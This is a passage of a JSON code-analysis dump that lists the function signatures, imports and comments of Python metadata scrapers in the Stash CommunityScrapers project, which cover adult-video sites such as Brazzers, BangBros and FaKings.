        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AShemaleTube/AShemaleTube.py",
        "docstrings": [],
        "function_defs": [
          "def get_proxies() -> dict:",
          "def li_value(key: str) -> str:",
          "def parse_date(date_string: str) -> str:",
          "def scrape_url(url):",
          "def scrape_url_to_string(url, max_retries=5):",
          "def remove_query(url: str) -> str:",
          "def performer_from_url(url) -> ScrapedPerformer | None:",
          "def scene_from_url(_url: str) -> ScrapedScene | None:"
        ],
        "class_defs": [],
        "imports": [
          "from datetime import datetime",
          "import json",
          "import re",
          "import sys",
          "from urllib.parse import urlparse, urlunparse",
          "from py_common import log",
          "from py_common.deps import ensure_requirements",
          "from py_common.types import (",
          "from py_common.util import scraper_args",
          "import cloudscraper  # noqa: E402",
          "from fp.fp import FreeProxy",
          "from lxml import html"
        ],
        "comments": [
          "# title",
          "# date",
          "# tags",
          "# performers",
          "# image"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 9,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AssumeThePositionStudios/AssumeThePositionStudios.py",
        "docstrings": [],
        "function_defs": [
          "def debugPrint(t):",
          "def scrape_scene(url):\nquery = \"\"\"\nquery scrapeSceneURL($url: String!) {\nscrapeSceneURL(url: $url) {\ntitle\ndetails\ncode\ndate\nimage\nurls"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "import requests",
          "import re",
          "import py_common.graphql as graphql",
          "import py_common.log as log"
        ],
        "comments": [
          "#Turn the content id from the filename into a scene id",
          "#Build a scene url from the sceneId"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/ATKGirlfriends/ATKGirlfriends.py",
        "docstrings": [],
        "function_defs": [
          "def getSceneByFilename(filename):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import os",
          "import re",
          "import requests",
          "import sys",
          "import py_common.log as log",
          "from lxml import html"
        ],
        "comments": [
          "# Parse filename",
          "# Fetch model page",
          "# Refetch page on cookie failure",
          "# Build performer",
          "# Build scene"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 10,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AuntJudys/AuntJudys.py",
        "docstrings": [],
        "function_defs": [
          "def scene_from_url(url):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import urllib.request",
          "import urllib.parse",
          "import py_common.log as log",
          "from py_common.util import scraper_args",
          "from py_common.deps import ensure_requirements",
          "from lxml import html  # noqa: E402"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AyloAPI/domains.py",
        "docstrings": [],
        "function_defs": [
          "def __save_domains():",
          "def site_name(url: str) -> str:\n\"\"\"\nReturns the site name of the given URL, e.g. \"brazzers\" for \"https://www.brazzers.com\"\n\"\"\"",
          "def get_token_for(domain: str, fallback: Callable[[str], str | None]) -> str | None:\n\"\"\"\nReturns a token for the given domain. If the stored token is not valid, the provided\nfallback function will be used to generate a new token.\n\nIf the fallback function returns None, it will return None.\n\"\"\"",
          "def all_domains() -> list[str]:\n\"\"\"\nReturns a list of all known domains for the Aylo API\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import atexit",
          "import datetime",
          "import json",
          "from pathlib import Path",
          "from typing import Callable",
          "from urllib.parse import urlparse"
        ],
        "comments": [
          "# If the domain is in the list and if the token is still valid we just return it",
          "# Generate the token using the provided fallback function",
          "# And persist it"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": [
          "@atexit.register"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AyloAPI/scrape.py",
        "docstrings": [],
        "function_defs": [
          "def default_postprocess(obj: Any, _) -> Any:",
          "def add_markers(scene_id: str, markers: list[dict]):",
          "def partition(pred, iterable):",
          "def format_time(seconds: int) -> str:",
          "def __raw_request(url, headers) -> requests.Response:",
          "def __api_request(url: str, headers: dict) -> dict | None:",
          "def _create_headers_for(domain: str) -> dict[str, str]:",
          "def get_instance_token(url: str) -> str | None:",
          "def _construct_url(api_result: dict) -> str:\n\"\"\"\nTries to construct a valid public URL for an API result\n\nThis will often result in scene links that point to the parent network site,\nso we might want to add wrapper scrapers that can add the correct URL as well\n\nFor example, a scene from We Live Together will have an URL for realitykings.com\nbut that scene is also on welivetogether.com and that might be considered more canonical\n\"\"\"",
          "def _construct_performer_url(api_result: dict, site: str) -> str:",
          "def get_studio(api_object: dict) -> ScrapedStudio | None:",
          "def to_tag(api_object: dict) -> ScrapedTag:",
          "def to_tags(api_object: dict) -> list[ScrapedTag]:",
          "def to_marker(api_object: dict) -> dict:",
          "def to_scraped_performer(",
          "def to_scraped_movie(movie_from_api: dict) -> ScrapedMovie:",
          "def to_scraped_scene(scene_from_api: dict) -> ScrapedScene:",
          "def to_scraped_gallery(scraped_scene: ScrapedScene) -> ScrapedGallery:",
          "def scene_from_url(",
          "def gallery_from_url(",
          "def performer_from_url(",
          "def movie_from_url(",
          "def find_scene(",
          "def matcher(candidate_title: str):",
          "def find_performer(",
          "def matcher(candidate_name: str):",
          "def scene_search(",
          "def matcher(candidate: ScrapedScene):",
          "def performer_search(",
          "def matcher(candidate: ScrapedPerformer):",
          "def scene_from_fragment(",
          "def gallery_from_fragment(",
          "def performer_from_fragment(",
          "def main_scraper():\n\"\"\"\nTakes arguments from stdin or from the command line and dumps output as JSON to stdout\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import re",
          "import sys",
          "import difflib",
          "import requests",
          "from datetime import datetime",
          "from html import unescape",
          "from typing import Any, Callable",
          "from urllib.parse import urlparse",
          "import py_common.log as log",
          "from py_common.util import dig, guess_nationality, scraper_args",
          "from py_common.config import get_config",
          "from py_common.types import (",
          "import AyloAPI.domains as domains",
          "from AyloAPI.slugger import slugify",
          "from itertools import tee, filterfalse",
          "from py_common.graphql import callGraphQL"
        ],
        "comments": [
          "# User Agent to use for the requests",
          "# Scrape markers when using 'Scrape with...'",
          "# Minimum similarity ratio to consider a match when searching",
          "# Debug mode will save the latest API response to disk",
          "## Temporary function to add markers to scenes, remove when/if Stash gets native support",
          "# network stuff",
          "# Even a 404 will contain an instance token",
          "# If we haven't stored a token we must provide a function to get one",
          "## Helper functions for the objects returned from Aylo's API",
          "# As documented by AdultSun, these tag IDs appear to be neutral but",
          "# are actually gendered so we can map them to their gender-specific counterparts",
          "## Helper functions to convert from Aylo's API to Stash's scaper return types",
          "# Older sites use this type",
          "# This is all we get when scraped as part of a scene or movie",
          "# All remaining fields are only available when scraped directly",
          "# Convert to cm",
          "# Convert to kg",
          "# Performers can have multiple images, try to get the biggest versions",
          "## Primary functions used to scrape from Aylo's API",
          "# Extract the domain from the URL",
          "# If you scrape a trailer we can still get the correct scene data",
          "# Extract the domain from the URL",
          "# Extract the domain from the URL",
          "# If you scrape a scene or trailer, we can still get the correct movie data",
          "# Since the \"Scrape with...\" function in Stash expects a single result, we provide",
          "# this function to return the first result that exceeds the threshold so",
          "# that users don't need to use scene_search directly and THEN take the first result",
          "# Since the \"Scrape with...\" function in Stash expects a single result, we provide",
          "# this function to return the first result that exceeds the threshold so",
          "# that users don't need to use performer_search directly and THEN take the first result",
          "# The source of the results will be based on the token used (Brazzers, Reality Kings, etc.)",
          "# Try to to avoid more than 10ish results or this will take forever",
          "# The source of the results will be based on the token used (Brazzers, Reality Kings, etc.)",
          "# Try to to avoid more than 10ish results or this will take forever"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 5,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AyloAPI/slugger.py",
        "docstrings": [],
        "function_defs": [
          "def slugify(string):"
        ],
        "class_defs": [],
        "imports": [
          "import re"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Babepedia/Babepedia.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_as_base64(url: str) -> str | None:",
          "def biography_xpath_test(tree, html_name: str, selector: str) -> str | None:",
          "def sanitize_ethnicity(str) -> Ethnicity:",
          "def sanitize_eye_color(str) -> EyeColor | None:",
          "def sanitize_hair_color(str) -> HairColor:",
          "def performer_from_url(url) -> ScrapedPerformer:",
          "def map_performer_search(performer) -> PerformerSearchResult:",
          "def performer_by_name(name) -> list[PerformerSearchResult]:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import re",
          "import sys",
          "from datetime import datetime # birthday formatting",
          "import cloudscraper",
          "from lxml import html",
          "import base64",
          "import py_common.log as log",
          "from py_common.util import scraper_args",
          "from py_common.types import ScrapedPerformer, PerformerSearchResult, Ethnicity, EyeColor, HairColor"
        ],
        "comments": [
          "# for image",
          "# catch mixed-race",
          "# brown to brunette",
          "# fixed gender",
          "# get birthdate",
          "# get death date",
          "# get career length",
          "# get country",
          "# get ethnicity",
          "# get eye color",
          "# get hair color",
          "# get height",
          "# get measurements",
          "# get fake/naturals",
          "# get tattoos",
          "# get piercings",
          "# get bio",
          "# get images"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/BangBros/BangBros.py",
        "docstrings": [],
        "function_defs": [
          "def redirect(url: str) -> str:",
          "def bangbros(obj: Any, _) -> Any:",
          "def urlfixer(x):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from requests import head",
          "from typing import Any",
          "from py_common import log",
          "from py_common.util import dig, replace_all, replace_at",
          "from AyloAPI.scrape import ("
        ],
        "comments": [
          "# All bangbros URLs omit the standard www. subdomain prefix",
          "# and all scene URLs use /video/ instead of the standard /scene/",
          "# Rename certain studios according to the map"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/BellesaPlus/BellesaPlus.py",
        "docstrings": [],
        "function_defs": [
          "def parse_response(data):",
          "def scrape_scene(url):",
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import requests",
          "import json",
          "import re",
          "import sys",
          "from py_common import log",
          "from datetime import datetime"
        ],
        "comments": [
          "# bellesa original series/studio filtering",
          "# ignore all redistribution scenes",
          "# Replace bellesa tags with stash tags (make sure hyphen is preserved)",
          "# tags that do not have a stash equivalent or are invalid either way",
          "# make sure hyphens are preserved",
          "# parse response for stash",
          "# clean tags",
          "# remove studio from tags",
          "# remove performers from tags",
          "# filter out bad tags",
          "# replace tags",
          "# replace hyphens with spaces",
          "# parse unix date to YYYY-MM-DD",
          "# replace URL with api url",
          "# check if response is nested",
          "# if nested, proceed to nested data",
          "# if not nested, proceed normally",
          "# check if response is from bellesaplus",
          "# bellesa scenes also include free redistributions and delayed scenes",
          "# check if scene is from bellesa original series/studio",
          "# If nothing is passed to the script:",
          "# If we've been given a URL:"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/BlackMaleMe/BlackMaleMe.py",
        "docstrings": [],
        "function_defs": [
          "def blackmaleme(obj: Any, _) -> Any:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Any",
          "from py_common import log",
          "from py_common.util import replace_at",
          "from AyloAPI.scrape import ("
        ],
        "comments": [
          "# Flatten all studios to just \"Black Male Me\""
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Blowpass/Blowpass.py",
        "docstrings": [],
        "function_defs": [
          "def determine_studio(api_object: dict[str, Any]) -> str | None:\n\"\"\"\nDetermine studio name from API object properties to use instead of the\n`studio_name` property scraped by default\n\"\"\"",
          "def postprocess_scene(scene: ScrapedScene, api_scene: dict[str, Any]) -> ScrapedScene:\n\"\"\"\nApplies post-processing to the scene\n\"\"\"",
          "def postprocess_movie(movie: ScrapedMovie, api_movie: dict[str, Any]) -> ScrapedMovie:\n\"\"\"\nApplies post-processing to the movie\n\"\"\"",
          "def postprocess_gallery(gallery: ScrapedGallery, api_gallery: dict[str, Any]) -> ScrapedGallery:\n\"\"\"\nApplies post-processing to the gallery\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Any",
          "from AlgoliaAPI.AlgoliaAPI import (",
          "from py_common import log",
          "from py_common.types import ScrapedScene",
          "from py_common.util import scraper_args"
        ],
        "comments": [
          "# steps through api_scene[\"availableOnSite\"], and picks the first match",
          "# most scenes have the studio name as the main channel name"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Brazzers/Brazzers.py",
        "docstrings": [],
        "function_defs": [
          "def brazzers(obj: Any, api_result: Any) -> Any:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Any",
          "from py_common import log",
          "from py_common.util import dig, replace_all, replace_at",
          "from AyloAPI.scrape import ("
        ],
        "comments": [
          "# Brazzers still hosts all of their VR content on a separate domain",
          "# All brazzers URLs use /video/ instead of the standard /scene/",
          "# and /pornstar/ instead of the standard /model",
          "# Rename certain studios according to the map",
          "# Brazzers Live special case: if the scene has the tag \"Brazzers Live\" we need to set the studio name to \"Brazzers Live\""
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/BrokenLatinaWhores/BrokenLatinaWhores.py",
        "docstrings": [],
        "function_defs": [
          "def get_scraped(inp):",
          "def performer_by_url():"
        ],
        "class_defs": [],
        "imports": [
          "import re",
          "import sys",
          "import requests",
          "import json",
          "from urllib.parse import urlparse",
          "import py_common.log as log",
          "from lxml import html"
        ],
        "comments": [
          "# Last Updated September 17, 2025"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Bromo/Bromo.py",
        "docstrings": [],
        "function_defs": [
          "def bromo(obj: Any, _) -> Any:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Any",
          "from py_common import log",
          "from py_common.util import replace_at",
          "from AyloAPI.scrape import ("
        ],
        "comments": [
          "# Bromo have updated their scenes so they have proper studios now"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/ComicInfoXML/ComicInfoXML.py",
        "docstrings": [],
        "function_defs": [
          "def query_xml(xml_file):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import pathlib",
          "import sys",
          "import xml.etree.ElementTree as ET",
          "import zipfile",
          "import py_common.graphql as graphql",
          "import py_common.log as log"
        ],
        "comments": [
          "# Stash has no concept of Series so we include it as a custom tag",
          "# Look inside the archive for the xml file"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/CopyFromScene/CopyFromScene.py",
        "docstrings": [],
        "function_defs": [
          "def get_names(data: list):",
          "def get_name(data: dict):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import os",
          "import sys",
          "import py_common.graphql as graphql",
          "import py_common.log as log"
        ],
        "comments": [
          "# to import from a parent directory we need to add that directory to the system path"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/CopyMetadata/CopyMetadata.py",
        "docstrings": [],
        "function_defs": [
          "def get_image_from_stash(image_url: str) -> bytes:",
          "def copy_scene(url: str):",
          "def copy_gallery(url: str):"
        ],
        "class_defs": [],
        "imports": [
          "import base64",
          "import requests",
          "import json",
          "import sys",
          "import re",
          "from py_common import graphql",
          "from py_common import log",
          "from py_common.util import scraper_args, dig"
        ],
        "comments": [
          "# urls can be None but we need an iterable"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/CopyToGallery/CopyToGallery.py",
        "docstrings": [],
        "function_defs": [
          "def get_gallery_id_by_path(abs_path):",
          "def update_gallery(input):",
          "def add_galleries_to_scene(scene_id, gallery_ids):",
          "def find_galleries(scene_id, scene_path):",
          "def update_images(input):",
          "def find_images(input):\nquery = \"\"\"\nquery FindImages($image_filter: ImageFilterType, $filter:FindFilterType) {\nfindImages(image_filter: $image_filter, filter: $filter) {\nimages {\nid\n}\n}\n}\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from pathlib import Path",
          "import py_common.graphql as graphql",
          "import py_common.log as log",
          "from py_common.config import get_config",
          "from py_common.util import dig"
        ],
        "comments": [
          "# Fields to copy from Gallery to Images",
          "# ADD to existing values or SET",
          "# Filters",
          "# Values can be MALE, FEMALE, TRANSGENDER_MALE, TRANSGENDER_FEMALE, INTERSEX, NON_BINARY"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 7,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/CopyToImages/CopyToImages.py",
        "docstrings": [],
        "function_defs": [
          "def update_images(input):",
          "def find_images(input):\nquery = \"\"\"\nquery FindImages($image_filter: ImageFilterType, $filter:FindFilterType) {\nfindImages(image_filter: $image_filter, filter: $filter) {\nimages {\nid\n}\n}\n}\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "import py_common.graphql as graphql",
          "import py_common.log as log",
          "from py_common.config import get_config",
          "from py_common.util import dig"
        ],
        "comments": [
          "# Fields to copy from Gallery to Images",
          "# ADD to existing values or SET"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/CzechHunter/CzechHunter.py",
        "docstrings": [],
        "function_defs": [
          "def czechhunter(obj: Any, _) -> Any:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Any",
          "from py_common import log",
          "from py_common.util import dig, replace_all",
          "from AyloAPI.scrape import ("
        ],
        "comments": [
          "# This will never be correct, but I don't see a better way to handle it",
          "# Replace the studio name in all URLs"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Deviante/Deviante.py",
        "docstrings": [],
        "function_defs": [
          "def deviante(obj: Any, _) -> Any:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Any",
          "from py_common import log",
          "from py_common.util import dig, replace_all",
          "from AyloAPI.scrape import ("
        ],
        "comments": [
          "# All deviante URLs use /video/ instead of the standard /scene/",
          "# and also have separate domains per studio"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/DigitalPlayground/DigitalPlayground.py",
        "docstrings": [],
        "function_defs": [
          "def digitalplayground(obj: Any, _) -> Any:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Any",
          "from py_common import log",
          "from py_common.util import replace_all",
          "from AyloAPI.scrape import ("
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/DownloadPass/DownloadPass.py",
        "docstrings": [],
        "function_defs": [
          "def get_html_from_url(url: str, session: requests.Session) -> html.HtmlElement | None:",
          "def get_first_elem_text(root: html.HtmlElement, expression: str) -> str | None:",
          "def urls_from_style(style_text: str) -> list[str]:",
          "def movie_from_url(url: str) -> ScrapedMovie:",
          "def get_table_text(tree: html.HtmlElement, header: str):",
          "def scene_from_url(url: str) -> ScrapedScene:",
          "def performer_from_url(url: str) -> ScrapedPerformer:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import re",
          "import sys",
          "from datetime import datetime as dt",
          "from py_common import log",
          "from py_common.deps import ensure_requirements",
          "from py_common.types import (",
          "from py_common.util import scraper_args",
          "import requests  # noqa: E402",
          "from lxml import html  # noqa: E402"
        ],
        "comments": [
          "# Name",
          "# Date",
          "# Duration",
          "# Covers",
          "# URL",
          "# Details",
          "# URL",
          "# Title",
          "# Image",
          "# Use the first thumbnail image name as scene image name. Naming convention happens to align.",
          "# Performers",
          "# Date",
          "# Groups",
          "# Tags",
          "# Studio"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 18,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Ersties/Ersties.py",
        "docstrings": [],
        "function_defs": [
          "def readJSONInput():",
          "def debugPrint(t):",
          "def clean_text(details: str) -> str:\n\"\"\"\nremove escaped backslashes and html parse the details text\n\"\"\"",
          "def get_scene(inputurl):",
          "def get_group(inputurl):",
          "def get_performer(inputurl):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import requests",
          "import re",
          "import json",
          "from py_common.util import guess_nationality",
          "from datetime import datetime",
          "from bs4 import BeautifulSoup as bs"
        ],
        "comments": [
          "#Authentication tokens and cookies are needed for this scraper. Use the network console in your browsers developer tools to find this information in an api call header.",
          "#Auth Variables For Header",
          "#Headers for Requests",
          "#Get JSON from Stash",
          "# Remove leading/trailing/double whitespaces",
          "# Use a regular expression to extract the number after '#play-' and before '-comments'",
          "# Check if the pattern was found and save it as a variable",
          "#Build URL to scrape",
          "#Scrape URL",
          "#Parse response",
          "#Check for valid response",
          "#Get Date",
          "# Check if the date is returned as an integer.",
          "#Convert date from Epoch Time",
          "#Get Group Information",
          "#Get Group Date",
          "# Check if the date is returned as an integer.",
          "#Convert date from Epoch Time",
          "# Check if URL is a Shoot",
          "#Scrape Shoot",
          "#Build URL to scrape group",
          "#Scrape URL",
          "#Parse response",
          "#Check for valid response",
          "#Get Date",
          "# Check if the date is returned as an integer.",
          "#Convert date from Epoch Time",
          "# Use a regular expression to extract the number after '#play-' and before '-comments'",
          "# Check if the pattern was found and save it as a variable",
          "#Build URL to scrape group",
          "#Scrape URL",
          "#Parse response",
          "#Check for valid response"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/EvilAngel/EvilAngel.py",
        "docstrings": [],
        "function_defs": [
          "def determine_studio(api_object: dict[str, Any]) -> str | None:\n\"\"\"\nDetermine studio name from API object properties to use instead of the\n`studio_name` property scraped by default\n\"\"\"",
          "def fix_ts_trans_find_replace(text: str) -> str | None:\n\"\"\"\nAt some point in time, there was a mass find-replace performed that replaced\nall occurrences of \"TS\" or \"ts\" with \"Trans\".\n\nThe problem with this is that it replaced every match naively, resulting in\nthese examples:\n- tits -> tiTrans\n- hits -> hiTrans\n",
          "def fix_url(_url: str) -> str:\n\"\"\"\nReplaces the host part of the URL if criteria matched\n\"\"\"",
          "def postprocess_scene(scene: ScrapedScene, api_scene: dict[str, Any]) -> ScrapedScene:\n\"\"\"\nApplies post-processing to the scene\n\"\"\"",
          "def postprocess_movie(movie: ScrapedMovie, api_movie: dict[str, Any]) -> ScrapedMovie:\n\"\"\"\nApplies post-processing to the movie\n\"\"\"",
          "def postprocess_gallery(gallery: ScrapedGallery, api_gallery: dict[str, Any]) -> ScrapedGallery:\n\"\"\"\nApplies post-processing to the gallery\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import re",
          "import sys",
          "from typing import Any",
          "from urllib.parse import urlparse",
          "from AlgoliaAPI.AlgoliaAPI import (",
          "from py_common import log",
          "from py_common.types import ScrapedScene",
          "from py_common.util import scraper_args"
        ],
        "comments": [
          "# steps through api_scene[\"availableOnSite\"], and picks the first match",
          "# if the site does not have a real/working domain"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/FakeHub/FakeHub.py",
        "docstrings": [],
        "function_defs": [
          "def fakehub(obj: Any, _) -> Any:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Any",
          "from py_common import log",
          "from py_common.util import dig, replace_all",
          "from AyloAPI.scrape import ("
        ],
        "comments": [
          "# All FakeHub performer URLs use /modelprofile/ instead of the standard /model/",
          "# and some studios have their own domains"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/FaKings/FaKings.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from py_common import log",
          "from py_common.util import scraper_args",
          "from FAKNetwork.scrape import scene_by_url, scene_search, scene_by_fragment"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/FAKNetwork/scrape.py",
        "docstrings": [],
        "function_defs": [
          "def clean_text(text):",
          "def tag_mappings(site, lang=\"en\"):",
          "def to_scraped_tag(api_obj: dict) -> ScrapedTag:",
          "def to_scraped_performer(api_obj: dict) -> ScrapedPerformer:",
          "def to_scraped_scene(data: dict, lang=\"en\") -> ScrapedScene:",
          "def scene_by_url(url: str) -> ScrapedScene | None:",
          "def scene_by_id(id: str) -> ScrapedScene | None: ...",
          "def scene_search(query: str, site, lang=\"en\") -> list[ScrapedScene]:",
          "def scene_by_fragment(fragment: dict) -> ScrapedScene | None:"
        ],
        "class_defs": [],
        "imports": [
          "from html import unescape",
          "import pathlib",
          "from urllib.parse import quote",
          "import json",
          "import re",
          "import requests",
          "from py_common import log",
          "from py_common.cache import cache_to_disk",
          "from py_common.config import get_config",
          "from py_common.types import ScrapedPerformer, ScrapedScene, ScrapedTag",
          "from py_common.util import dig, scraper_args",
          "from FAKNetwork.sites import to_scraped_studio"
        ],
        "comments": [
          "# Flattens the studio / series hierarchy to just output the studio",
          "# for example",
          "# - when True: studio is FaKings",
          "# - when False: studio is MILF Club, parent is FaKings",
          "# default to english",
          "# Placeholder until we can figure out how to map filenames back to scenes",
          "# TODO: figure out if we can map the filename back to the scene: it's in the API but might not be queryable",
          "# 7-130-tania -> https://fakings.com/en/video/we-go-into-a-bar-full-of-people-only-the-manager-knows-tania-does-what-she-does-best-and",
          "# Studio code returned by this scraper is currently the filename, but TPDB use the URL slug so this could work for some"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 0,
        "decorators": [
          "@cache_to_disk(ttl=60 * 60 * 24)"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/FAKNetwork/sites.py",
        "docstrings": [],
        "function_defs": [
          "def to_scraped_studio(api_object: dict, lang=\"en\"):"
        ],
        "class_defs": [],
        "imports": [
          "from py_common.util import dig"
        ],
        "comments": [
          "# All series fetched from the API on 2025-07-04",
          "# English: https://api.faknetworks.com/v1/series?lang=en&page=1&take=1000",
          "# Spanish: https://api.faknetworks.com/v1/series?lang=es&page=1&take=1000",
          "# Portuguese: https://api.faknetworks.com/v1/series?lang=es&page=1&take=1000"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/FantiaJp/fantiajp.py",
        "docstrings": [],
        "function_defs": [
          "def readJSONInput():",
          "def send_request(url: str, headers: dict = None):\n\"\"\"\nget post response from url\n\"\"\"",
          "def get_csrf() -> str:",
          "def get_post_id(url: str) -> str:",
          "def get_post_data(url: str):",
          "def get_post_infos(url: str):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import json",
          "import re",
          "from datetime import datetime",
          "import requests",
          "from lxml import etree",
          "from py_common import log"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 10,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/FetishKitsch/FetishKitsch.py",
        "docstrings": [],
        "function_defs": [
